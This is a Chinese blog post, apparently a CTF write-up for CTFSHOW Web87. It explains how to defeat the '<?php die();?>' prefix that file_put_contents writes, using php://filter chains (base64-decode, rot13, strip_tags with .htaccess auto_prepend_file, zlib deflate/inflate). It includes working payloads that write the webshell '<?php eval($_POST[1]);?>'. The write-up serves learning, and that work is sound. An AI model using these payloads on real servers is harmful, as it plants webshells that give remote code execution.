<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>不要捉弄我新人同学: F - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="不要捉弄我新人同学: F - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AF/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:43:20.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">不要捉弄我新人同学: F</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h3 id="——————为什么问题会越来越多呢？"><a href="#——————为什么问题会越来越多呢？" class="headerlink" title="——————为什么问题会越来越多呢？"></a>——————为什么问题会越来越多呢？</h3><p>打CTFSHOW的文件包含题的时候，做到最后一题，本以为会就这么愉快的结束一天的行程，没想到又是一个落下已久的坑！</p>
<h2 id="CTFSHOW——Web87"><a href="#CTFSHOW——Web87" class="headerlink" title="CTFSHOW——Web87"></a>CTFSHOW——Web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就出现了死亡代码<code>&lt;?php die();?&gt;</code>一旦执行，程序结束，所以我们有什么办法可以避免执行呢？</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>解法一</p>
<ul>
<li>介绍一下base64解码的特点</li>
</ul>
<p>首先base64解码时只会识别字母和一些特殊字符如&#x3D;，其他的不识别，其次base64解码是将4个字节转化为3个字节，如：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393036667-a28d4d75-3b5e-4913-b681-c6182e1ad0ee.png#averageHue=%23fcfbfa&clientId=ud9101c01-db66-4&from=paste&height=303&id=u4ff91f68&name=image.png&originHeight=379&originWidth=316&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13898&status=done&style=none&taskId=ub14fdb69-ae1b-4637-be4e-1c564b53401&title=&width=252.8" alt="image.png"><br>利用这一特性我们可以将题目做出来</p>
<ul>
<li>base64编码的特点</li>
</ul>
<p>base64编码和解码是反过来的，三个字节转换为四个字节</p>
<p>base64以&#x3D;结尾的意义是为了补位，base64编码后的长度需要是4个字符的倍数，如果不是4的倍数需要在结尾加上&#x3D;，这个&#x3D;去掉与否不影响我们使用伪协议</p>
<ul>
<li><p>简单来讲，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Base64&spm=1001.2101.3001.7020">Base64</a>就是用下列总计64个字符：</p>
<ul>
<li>A-Z	</li>
<li>a-z</li>
<li>0-9</li>
<li><ul>
<li></li>
</ul>
</li>
<li>&#x2F;</li>
</ul>
</li>
<li><p>浏览器解码特点</p>
</li>
</ul>
<p>其实当我们在浏览器传参时，浏览器是会先帮我们进行一次url解码的</p>
<ul>
<li>利用filter伪协议</li>
</ul>
<p>？file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php<br>假如我们的file就是这个伪协议的话，注意这里是<code>decode</code>，我们会把文件里面的内容进行base64解码，因为死亡代码中只有<code>phpdie</code>会被识别出来，只有六个字节，这时候我们再content最前面添加2个字节就可以<code>销毁死亡代码</code></p>
<ul>
<li>payload</li>
</ul>
<p>由于浏览器会帮我们进行一次解码，所以这里我们要进行两次URL加密</p>
<p>这里的url编码是要所有字符都进行编码，这里推荐一个网址：<a target="_blank" rel="noopener" href="http://web.chacuo.net/charseturlencode">http://web.chacuo.net/charseturlencode</a>（选择里面的复杂模式）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line"><span class="comment">#这里就是相当于php://filter/convert.base64-decode/resource=cmd.php</span></span><br><span class="line"><span class="comment">#同时传入content</span></span><br><span class="line">content=aaaaaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br><span class="line"><span class="comment">#PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+等价于&lt;?php eval($_POST[1]);?&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>PS：这边不能单单的添加两个a，这时候会出现乱码，由于phpdie是6个字节，当我们添加2个字节aa时：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393557573-055e4f70-229a-4206-a688-54a1698039b5.png#averageHue=%23fbfaf9&clientId=ud9101c01-db66-4&from=paste&height=314&id=u9434e69a&name=image.png&originHeight=392&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30088&status=done&style=none&taskId=u0cedff01-46ba-4c01-a0a7-c921c1d4d63&title=&width=507.2" alt="image.png"><br>可以看到我们的尖括号没了，这时候代码不会被运行，这是一个bug吧，类似，当我们再凑四个字节也就是phpdieaaaaa时：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393599251-47d9d184-0cea-4d06-876b-bc1f24ac2d9e.png#averageHue=%23fbfafa&clientId=ud9101c01-db66-4&from=paste&height=312&id=udb8e9eff&name=image.png&originHeight=390&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33590&status=done&style=none&taskId=u0a20ca7f-13f9-4dbe-a458-a3606327842&title=&width=640" alt="image.png">我们的尖括号就回来了然后<code>死亡代码销毁</code>，程序得以RCE运行，密码是1，最后只需要一步步的去读取flag就可以了</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用rot13过滤器：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422714599-c7dc25a2-56f8-4648-8b7e-b652ff8225cb.png#averageHue=%23fefefe&clientId=ud9101c01-db66-4&from=paste&height=518&id=uf6cfb136&name=image.png&originHeight=648&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15542&status=done&style=none&taskId=u3a44fb80-017b-4023-bb0f-166928bf249&title=&width=777.6" alt="image.png"><br>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php<br>content&#x3D;<?cuc riny($_cbfg[1]);?><br>传入后1.php的内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc qvr(&#x27;大佬别秀了);&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>前面的不会被识别，而我们的eval被识别，RCE就绪</p>
<h2 id="FIlter-x2F-x2F-伪协议精讲"><a href="#FIlter-x2F-x2F-伪协议精讲" class="headerlink" title="FIlter:&#x2F;&#x2F;伪协议精讲"></a>FIlter:&#x2F;&#x2F;伪协议精讲</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h2-8">https://www.anquanke.com/post/id/202510#h2-8</a><br>直接上链接，讲的挺精辟的</p>
<h2 id="正式探索file-put-contents和死亡代码"><a href="#正式探索file-put-contents和死亡代码" class="headerlink" title="正式探索file_put_contents和死亡代码"></a>正式探索file_put_contents和死亡代码</h2><p>一共三种类型</p>
<blockquote>
<p>file_put_contents($filename,”&lt;?php exit();”.$content);</p>
<p>file_put_contents($content,”&lt;?php exit();”.$content);</p>
<p>file_put_contents($filename,$content . “\nxxxxxx”);</p>
</blockquote>
<p>这里我们的思路一般是想要将杂糅或者死亡代码分解掉；这里思路基本上都是利用php伪协议<code>filter</code>，结合编码或者相应的过滤器进行绕过；其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码；</p>
<h3 id="对于第一种情况"><a href="#对于第一种情况" class="headerlink" title="对于第一种情况"></a>对于第一种情况</h3><h4 id="1-base64编码绕过"><a href="#1-base64编码绕过" class="headerlink" title="1.base64编码绕过"></a>1.base64编码绕过</h4><p>原理：利用base64编码，将死亡代码解码成乱码！这样php无法识别</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#$filename=&#x27;php://filter/convert.base64-decode/resource=1.php&#x27;;</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;aPD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;<span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码的意思就是，将content写入1.php，然后对写入的代码进行base64解码<br>由于我们多加了一个a，让原本是phpexit(7字节)，变成了phpexita(8字节）进而变成了乱码<br>而我们的$content &#x3D; ‘aPD9waHAgcGhwaW5mbygpOz8+’会被解码成<?php phpinfo();?>，然后访问1.php就好被执行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662404341705-82a8f259-684a-43e2-875c-2624fdce1fc8.png#averageHue=%23303027&clientId=ud9101c01-db66-4&from=paste&height=198&id=u6f248b4a&name=image.png&originHeight=247&originWidth=1430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57247&status=done&style=none&taskId=u1dd34e2a-83c7-462c-b756-ca83c250a04&title=&width=1144" alt="image.png"></p>
<h4 id="2-rot13编码绕过"><a href="#2-rot13编码绕过" class="headerlink" title="2.rot13编码绕过"></a>2.rot13编码绕过</h4><p>rot13和base64一样也可以分解死亡代码，但是原理不同，rot13不是构造乱码，仅仅只是编码而已</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#$filename=&#x27;php://filter/string.rot13/resource=1.php&#x27;;</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?cuc cucvasb();?&gt;&#x27;</span>;<span class="comment">#&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662409056557-2e02068f-a2c7-4e32-8ac6-f7bd5e8cd873.png#averageHue=%232f2f27&clientId=ud9101c01-db66-4&from=paste&height=206&id=ued5d5c0d&name=image.png&originHeight=257&originWidth=1404&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55372&status=done&style=none&taskId=u98b5dcc0-2aba-4f5c-bbb2-1ec42d3cef6&title=&width=1123.2" alt="image.png"><br>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的&lt;?并没有分解掉，这时，如果服务器开启了<code>短标签</code>，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
<h5 id="段标签"><a href="#段标签" class="headerlink" title="段标签"></a>段标签</h5><? ?><p>是短标签<br><?php ?>是长标签<br>在php的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：<? ?><br>同时，只有开启这个才可以使用 <?= 以代替 <? echo 。在CodeIgniter的视频教程中就是用的这种方式。
但是这个短标签是不推荐的，使用<?php ?>才是规范的方法。只是因为这种短标签使用的时间比较长，这种特性才被保存了下来。</p>
<p>那么short_open_tag到底是什么呢？</p>
<p>决定是否允许使用代码开始标志的缩写形式（<? ?> ）。如果要和 XML 结合使用 PHP，可以禁用此选项以便于嵌入使用<?xml ?> 。否则还可以通过php来输出，例如：<?php echo '<?xml version="1.0"'; ?> 。如果禁用了，必须使用 PHP 代码开始标志的完整形式（<?php ?> ）。</p>
<p>注意：本指令也会影响到缩写形式 &lt;?&#x3D; ，它和 &lt;? echo 等价。使用此缩写需要short_open_tag 的值为 On。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40491569/article/details/83076481">
</a></p>
<h4 id="3-htaccess的预包含利用"><a href="#3-htaccess的预包含利用" class="headerlink" title="3.htaccess的预包含利用"></a>3.htaccess的预包含利用</h4><p>利用.htaccess文件的一些特性，可以来直接读取flag文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/string.strip_tags/resource=.htaccess&#x27;</span>;<span class="comment">#这里编译器的属性是write=,不主动写就像是智能识别一样，自己帮你去选择write，这里不能选择read，会无效</span></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;&lt;?php die();?&gt;php_value auto_prepend_file C:\wamp64\www\FLAG\flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#这里的&lt;?php die();是来模拟题目插入的死亡代码</span></span><br></pre></td></tr></table></figure>
<p>这段代码的意思是，向.htaccess文件中写入<code>&lt;?php die();?&gt;php_value auto_prepend_file D:\s1mple.php</code>,由于<code>string.strip_tags</code>过滤器存在，string.strip_tags可以去除html和PHP的标签，会把<code>&lt;?php die();?&gt;</code>去除，他识别了<?php ?>这个标签<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662410864437-1acfde0b-7f3f-4be5-a4c6-356cc20107a6.png#averageHue=%23515860&clientId=ud9101c01-db66-4&from=paste&height=183&id=u91684151&name=image.png&originHeight=229&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13581&status=done&style=none&taskId=u25871ca9-41c6-43be-af87-8e71aa1939b&title=&width=658.4" alt="image.png"><br>这里写入后死亡代码已经消失！</p>
<p>意思是每次打开一个php文件之前，都会先打开flag.php文件，利用这个我们可以读取flag文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;here is flag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662410622388-96ebf7ee-e457-4f37-a95f-3d6a4252e0d2.png#averageHue=%23575e66&clientId=ud9101c01-db66-4&from=paste&height=448&id=ub66a8b1b&name=image.png&originHeight=560&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46354&status=done&style=none&taskId=u7b3def45-11af-43a2-9194-55c69768d4c&title=&width=982.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662410837904-09f39d85-48c0-4336-ab65-6963d881146e.png#averageHue=%23e1c293&clientId=ud9101c01-db66-4&from=paste&height=139&id=u2c1d6407&name=image.png&originHeight=174&originWidth=503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6214&status=done&style=none&taskId=uf96ea8e1-6601-4956-8492-781da96e576&title=&width=402.4" alt="image.png"><br>我们访问的是upload.php，却成功运行了flag.php</p>
<p><strong>注意事项：</strong>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 flag.php flag &#x2F;flag &#x2F;flag.php 等等；另外还有个很大的问题是，<code>string.strip_tags</code>过滤器只是可以在<code>php5</code>的环境下顺利的使用，如果题目环境是在<code>php7.3.0</code>以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了<code>string.strip_tags</code>这个过滤器；</p>
<h4 id="4-混合叠加"><a href="#4-混合叠加" class="headerlink" title="4.混合叠加"></a>4.混合叠加</h4><p>顾名思义，叠BUFF的写法<br><strong>第一掌式：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=1.php&#x27;</span></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;&lt;?php exit();?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span></span><br><span class="line">  <span class="comment">#这里的&lt;?php exit();也是模拟题目的死亡代码</span></span><br></pre></td></tr></table></figure>
<p>和预包含htaccess文件很相似，将content写入1.php文件，之后用<code>string.strip_tags</code>去除php标签，也就是<code>死亡代码</code><strong>，</strong>最后再进行base64解码，把我们要执行的代码解码<br>这边编译器默认也是write&#x3D;，不填的话就类似智能识别，上面也说了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662412440430-d9598258-3e14-4790-a166-c9638cd87b8a.png#averageHue=%233f4750&clientId=ud9101c01-db66-4&from=paste&height=189&id=ud371d66f&name=image.png&originHeight=236&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23486&status=done&style=none&taskId=u597a6455-32b1-4269-af72-7642500b5bc&title=&width=736.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662412452319-7ba20387-e208-4788-a3c1-f76135099b7d.png#averageHue=%23f4e4c6&clientId=ud9101c01-db66-4&from=paste&height=636&id=u003977be&name=image.png&originHeight=795&originWidth=1682&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107605&status=done&style=none&taskId=uc61f2eb0-2ed6-4fc4-bd1d-99c256317d3&title=&width=1345.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662412473673-a6565862-668c-4855-b617-74e14be959bb.png#averageHue=%23626971&clientId=ud9101c01-db66-4&from=paste&height=161&id=u50314777&name=image.png&originHeight=201&originWidth=751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17630&status=done&style=none&taskId=u3bd5bbca-3c9f-4dcd-8603-d4757fafb89&title=&width=600.8" alt="image.png"><br>可以看到已经完美的写入了进去，并且得到了运行</p>
<p><strong>第二掌法：</strong><br>如果题目的环境是<code>php7</code>的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入<code>shell</code>；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662416656084-47548d65-b932-4acf-8866-fe80af019d93.png#averageHue=%238da3bc&clientId=ud9101c01-db66-4&from=paste&height=97&id=u5a0b62e7&name=image.png&originHeight=121&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5506&status=done&style=none&taskId=uf9ecf3ab-d2bb-446c-8b52-38a477bc058&title=&width=471.2" alt="image.png"><strong><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662416663706-ffc73d63-07a1-4bd3-abe9-23646abb0121.png#averageHue=%23434d57&clientId=ud9101c01-db66-4&from=paste&height=55&id=u94758754&name=image.png&originHeight=69&originWidth=220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4168&status=done&style=none&taskId=u65bc0318-a1bf-4d61-8797-b9d4344d473&title=&width=176" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662416669978-987559ea-1907-470f-a2e0-7da41c698589.png#averageHue=%23dad3ad&clientId=ud9101c01-db66-4&from=paste&height=417&id=u7c8e5456&name=image.png&originHeight=521&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74193&status=done&style=none&taskId=u41497038-9f01-4c36-90fa-72d7e62b229&title=&width=1334.4" alt="image.png"><br>由结果图可以得知，用压缩和解压的方法也是可以摧毁<code>死亡代码</code>的<br>ATTENTION：</strong>若我们使用POST传递content一定用burpsuite去传参，hackbar有他奶奶的bug！！！**</p>
<h3 id="对于第二种情况"><a href="#对于第二种情况" class="headerlink" title="对于第二种情况"></a>对于第二种情况</h3><p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code>如此又该如何去处理呢？</p>
<h4 id="1-常规base64方法"><a href="#1-常规base64方法" class="headerlink" title="1.常规base64方法"></a>1.常规base64方法</h4><p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者<code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code><br>我们写的这些小<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662419864499-1f775790-ced9-449f-ab30-85fadcee5e90.png#averageHue=%233e3521&clientId=ud9101c01-db66-4&from=paste&height=38&id=ue0e8bfa4&name=0DFC537A.png&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3590&status=done&style=none&taskId=ua80bdcb2-eddf-44e4-87ae-d87e4095a39&title=&width=38.4" alt="0DFC537A.png">是作为文件名而不是写入代码，由于后边跟了一个.$content所以还要把这一整段代码黏上去：</p>
